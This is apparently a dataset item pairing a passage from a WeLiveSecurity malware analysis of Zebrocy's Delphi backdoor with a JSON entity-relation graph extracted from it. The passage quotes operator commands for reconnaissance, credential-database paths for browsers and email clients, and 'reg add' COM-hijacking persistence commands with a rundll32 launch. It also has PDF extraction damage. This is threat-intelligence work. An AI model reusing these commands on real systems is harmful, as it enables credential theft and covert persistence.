@@ -1,0 +1,200 @@
+
+
+
+Sentence : How the bear hunts
+In this section we describe in more detail the commands performed manually by the
+operators through their Delphi backdoor.
+The commands available are located in one of the configuration blobs mentioned earlier
+(the “commands” blob in Figure 3). The number of supported commands has increased
+over time, with the latest version of the backdoor having more than thirty. As we did not
+identify a pattern in the order which the commands are invoked, we believe the
+operators are executing them manually.
+The first set of commands gathers information about the victim’s computer and
+environment:
+SCREENSHOT None
+SYS_INFO None
+GET_NETWORK None
+SCAN_ALL None
+The commands above are commonly executed when the operators first connect to a
+newly activated backdoor. They don’t have any arguments, and they are quite selfexplanatory. Other commands commonly seen executed shortly after these backdoors
+are activated, listed below:
+REG_GET_KEYS_‐
+VALUES
+DOWNLOAD_DAY(30)
+DOWNLOAD_DAY(1)
+HKEY_CURRENT_USER
+Software\Microsoft\Windows\CurrentVersion
+c:*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg;.jpeg;
+.bmp;.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;*.lhz;
+d:*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg;.jpeg;
+.bmp;.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;*.lhz;
+c:*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg.jpeg
+.bmp.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;
+d:*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg.jpeg
+.bmp.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;
+CMD_EXECUTE echo %APPDATA%
+ipconfig /all
+netstat -aon
+CMD_EXECUTE wmic process get Caption,ExecutablePath
+reg query
+"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
+https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 5/10
+5/23/2019 A journey to Zebrocy land | WeLiveSecurity
+Those who already have read our previous articles about Zebrocy will notice that more
+or less the same kind of information is sent, over and over again by previous stages.
+This information is requested within a few minutes of initial compromise and the amount
+of data the operator will have to deal with is quite considerable.
+In order to collect even more information, from time to time the Zebrocy operators upload
+and use dumpers on victims’ machines. The current dumpers have some similarities with
+those previously used by the group. In this case, Yandex Browser, Chromium, 7Star
+Browser ( a Chromium- based browser ), and CentBrowser are targeted, as well as
+versions of Microsoft Outlook from 1997 through 2016:
+UPLOAD_AND_EXECUTE_FILE C:\ProgramData\Office\MS\msoffice.exe
+[…]
+4D5A9000…
+These dumpers create log files indicating the presence or absence of potential
+databases to dump:
+DOWNLOAD_LIST C:\ProgramData\Office\MS\out.txt
+C:\ProgramData\Office\MS\text.txt
+The current dumper contains the following output when there are no databases to dump:
+%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Login Data not found
+%LOCALAPPDATA%\Chromium\User Data\Default\Login Data not found
+%LOCALAPPDATA%\7Star\7Star\User Data\Default\Login Data not found
+%LOCALAPPDATA%\CentBrowser\User Data\Default\Login Data not found
+These dumpers are quickly removed once they have done their job. Moreover, the
+backdoor contains a list of filenames related to credentials from software listed below
+(database names):
+key3.db Firefox private keys (now named key4.db)
+cert8.db Firefox certificate database
+logins.json Firefox encrypted password database
+account.cfn The Bat! (email client) account credentials
+wand.dat Opera password database
+The operators take care of retrieving these databases if they are present on the victim’s
+computer.
+%APPDATA%\The Bat!\Account.CFN
+DOWNLOAD_LIST
+%APPDATA%\The Bat![REDACTED]\Account.CFN
+The operators retrieve these files on the machine using the DOWNLOAD_LIST
+command. This command can be used when the operators are aware of the presence of
+interesting files on the computer.
+https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 6/10
+5/23/2019 A journey to Zebrocy land | WeLiveSecurity
+Finally, depending on how interesting the victim is, they malware operators may deploy
+another custom backdoor. This backdoor is executed using the CMD_EXECUTE
+command:
+Com‐
+mand
+Arguments
+CMD_
+EXE‐
+1
+CUTE
+2
+3
+reg add "HKCU\Software\Classes\CLSID{0CD069CF-AC9B-41F4-95713A95A62C36A1}" /ve /d "Reliability Maintenance Control Panel" /reg:64
+/f&&reg add "HKCU\Software\Classes\CLSID{0CD069CF-AC9B-41F49571-3A95A62C36A1}\InProcServer32" /ve /d
+"%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll" /reg:64 /f&&reg add
+"HKCU\Software\Classes\CLSID{0CD069CF-AC9B-41F4-95713A95A62C36A1}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d
+"Both" /reg:64 /f
+rundll32.exe "%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll",#1
+687474703A2F2F[REDACTED]
+dir /s /b /o:gn %APPDATA%\Microsoft\
+There are some interesting facts here. First, they use COM object hijacking to make the
+malware persistent on the system even though the custom backdoor is installed only for
+a few hours. Second, the hex-encoded string is the C&C used by the custom backdoor
+while in the Delphi backdoor the C&C is embedded in the configuration.
+The two Delphi backdoors, the common one and the one above, are quite similar but
+contain these interesting tweaks:
+Delphi compiler version 14.0-15.0 32.0
+32/64-bit 32-bit 64-bit
+Configuration location resource
+section
+no config (C&C is passed as an
+argument)
+Number of commands 5 3
+Encryption algorithm AES ECB custom
+Lifetime on the
+computer
+a few days a few hours
+Once again, it’s not very clear what the purpose of this custom backdoor is. The
+detection ratio is definitely lower in comparison to the “usual” backdoor. The very short
+timeframe where this backdoor is on the system and operating makes it harder to
+retrieve. Once its operators complete their evil deeds, they quickly remove it.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Delphi backdoor", "type": "APPS"},
+        {"id": 2, "description": "Zebrocy operators", "type": "ACTO"},
+        {"id": 3, "description": "Victim’s computer and environment", "type": "TAMP"},
+        {"id": 4, "description": "SCREENSHOT command", "type": "TTPS"},
+        {"id": 5, "description": "SYS_INFO command", "type": "TTPS"},
+        {"id": 6, "description": "GET_NETWORK command", "type": "TTPS"},
+        {"id": 7, "description": "SCAN_ALL command", "type": "TTPS"},
+        {"id": 8, "description": "REG_GET_KEYS_VALUES command", "type": "TTPS"},
+        {"id": 9, "description": "DOWNLOAD_DAY(30) command", "type": "TTPS"},
+        {"id": 10, "description": "DOWNLOAD_DAY(1) command", "type": "TTPS"},
+        {"id": 11, "description": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "type": "REGI"},
+        {"id": 12, "description": "C:\\*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg;.jpeg;.bmp;.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;*.lhz", "type": "TAMP"},
+        {"id": 13, "description": "D:\\*.doc;.docx;.xls;.xlsx;.ppt;.pptx;.rtf;.tif;.tiff;.jpg;.jpeg;.bmp;.rar;.zip;.pdf;.KUM;.kum;.tlg;.TLG;.sbx;.crf;.hse;.hsf;*.lhz", "type": "TAMP"},
+        {"id": 14, "description": "echo %APPDATA%", "type": "TTPS"},
+        {"id": 15, "description": "ipconfig /all command", "type": "TTPS"},
+        {"id": 16, "description": "netstat -aon command", "type": "TTPS"},
+        {"id": 17, "description": "wmic process get Caption,ExecutablePath command", "type": "TTPS"},
+        {"id": 18, "description": "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s command", "type": "TTPS"},
+        {"id": 19, "description": "%APPDATA%\\The Bat!\\Account.CFN", "type": "DOCF"},
+        {"id": 20, "description": "%APPDATA%\\The Bat![REDACTED]\\Account.CFN", "type": "DOCF"},
+        {"id": 21, "description": "Yandex Browser", "type": "APPS"},
+        {"id": 22, "description": "Chromium", "type": "APPS"},
+        {"id": 23, "description": "7Star Browser", "type": "APPS"},
+        {"id": 24, "description": "CentBrowser", "type": "APPS"},
+        {"id": 25, "description": "Microsoft Outlook (1997-2016)", "type": "APPS"},
+        {"id": 26, "description": "C:\\ProgramData\\Office\\MS\\msoffice.exe", "type": "EXEF"},
+        {"id": 27, "description": "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", "type": "DOCF"},
+        {"id": 28, "description": "%LOCALAPPDATA%\\Chromium\\User Data\\Default\\Login Data", "type": "DOCF"},
+        {"id": 29, "description": "%LOCALAPPDATA%\\7Star\\7Star\\User Data\\Default\\Login Data", "type": "DOCF"},
+        {"id": 30, "description": "%LOCALAPPDATA%\\CentBrowser\\User Data\\Default\\Login Data", "type": "DOCF"},
+        {"id": 31, "description": "key3.db (Firefox private keys)", "type": "DOCF"},
+        {"id": 32, "description": "cert8.db (Firefox certificate database)", "type": "DOCF"},
+        {"id": 33, "description": "logins.json (Firefox encrypted password database)", "type": "DOCF"},
+        {"id": 34, "description": "account.cfn (The Bat! email client account credentials)", "type": "DOCF"},
+        {"id": 35, "description": "wand.dat (Opera password database)", "type": "DOCF"},
+        {"id": 36, "description": "C:\\ProgramData\\Office\\MS\\out.txt", "type": "DOCF"},
+        {"id": 37, "description": "C:\\ProgramData\\Office\\MS\\text.txt", "type": "DOCF"},
+        {"id": 38, "description": "%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll", "type": "EXEF"},
+        {"id": 39, "description": "Custom backdoor", "type": "APPS"},
+        {"id": 40, "description": "COM object hijacking", "type": "TTPS"},
+        {"id": 41, "description": "687474703A2F2F[REDACTED]", "type": "CCSH"}
+    ],
+    "edges": [
+        {"source": 2, "target": 1, "rel_name": "uses"},
+        {"source": 2, "target": 3, "rel_name": "targets"},
+        {"source": 4, "target": 3, "rel_name": "gathers information from"},
+        {"source": 5, "target": 3, "rel_name": "gathers information from"},
+        {"source": 6, "target": 3, "rel_name": "gathers information from"},
+        {"source": 7, "target": 3, "rel_name": "scans all on"},
+        {"source": 8, "target": 11, "rel_name": "gets keys and values from"},
+        {"source": 9, "target": 12, "rel_name": "downloads files from"},
+        {"source": 10, "target": 13, "rel_name": "downloads files from"},
+        {"source": 14, "target": 3, "rel_name": "executes on"},
+        {"source": 15, "target": 3, "rel_name": "executes on"},
+        {"source": 16, "target": 3, "rel_name": "executes on"},
+        {"source": 17, "target": 3, "rel_name": "executes on"},
+        {"source": 18, "target": 11, "rel_name": "queries registry from"},
+        {"source": 26, "target": 3, "rel_name": "downloads and executes on"},
+        {"source": 27, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 28, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 29, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 30, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 31, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 32, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 33, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 34, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 35, "target": 3, "rel_name": "attempts to access on"},
+        {"source": 36, "target": 3, "rel_name": "creates and writes to on"},
+        {"source": 37, "target": 3, "rel_name": "creates and writes to on"},
+        {"source": 2, "target": 19, "rel_name": "downloads and accesses"},
+        {"source": 2, "target": 20, "rel_name": "downloads and accesses"},
+        {"source": 38, "target": 3, "rel_name": "registers and executes on"},
+        {"source": 39, "target": 41, "rel_name": "communicates with"}
+    ]
+}
